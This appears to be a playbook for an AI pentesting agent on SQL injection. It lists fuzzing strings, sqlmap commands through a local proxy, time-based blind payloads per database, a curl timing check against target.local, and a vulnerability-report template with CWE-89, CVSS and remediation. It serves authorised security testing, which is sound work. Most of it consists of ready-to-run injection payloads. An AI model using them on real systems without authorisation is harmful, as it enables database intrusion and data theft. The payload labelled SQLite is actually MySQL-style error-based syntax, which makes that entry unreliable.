# Offensive Playbook: SQL Injection (SQLi) & Database Exploitation

## 1. Overview & Attack Surface
SQL Injection occurs when untrusted user input is directly concatenated or formatted into a database query string instead of using parameterized prepared statements or safe ORM queries.

## 2. Detection & Heuristic Fuzzing
1. Identify all query parameters, form fields, headers (`X-Forwarded-For`, `User-Agent`), and JSON keys that trigger database queries.
2. Probe with basic arithmetic and syntax break strings:
   ```text
   '
   "
   ' OR '1'='1
   " OR "1"="1
   ' AND 1=1-- -
   ' AND 1=2-- -
   1 AND 1=1
   1 AND 1=2
   ```
3. Observe differences in:
   - HTTP response status code (200 vs 500)
   - Response length / content variations (Boolean-based blind)
   - Time delays (Time-based blind)

## 3. Automated & Manual Exploitation in Sandbox

### A. SQLMap Automated Exploitation
Run `sqlmap` inside the sandbox with Caido proxy tracking:
```bash
sqlmap -u "https://target.local/api/items?category=books" \
       --proxy="http://127.0.0.1:48080" \
       --batch --level=2 --risk=2 --dbs
```
For authenticated POST requests with JSON payload:
```bash
sqlmap -r request.txt --batch --dbs
```

### B. Time-Based Blind Confirmation (PoC)
Test database-specific sleep payloads to confirm vulnerability without relying on error messages:
- **PostgreSQL**: `' || pg_sleep(5)--`
- **MySQL**: `' OR (SELECT SLEEP(5))-- -`
- **SQLite**: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT '1')),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -`

Verify with `curl` measuring response duration:
```bash
time curl -s "https://target.local/api/search?q=%27%20OR%20(SELECT%20SLEEP(5))--%20-"
```

## 4. Verification & Reporting
1. Confirm ability to extract database banner or user table name (`SELECT version()`, `current_user`).
2. File finding via `create_vulnerability_report`:
   - **Category**: Injection (OWASP A03:2021)
   - **CWE**: CWE-89
   - **CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 9.8 Critical)
   - **Remediation**: Use parameterized queries / prepared statements.
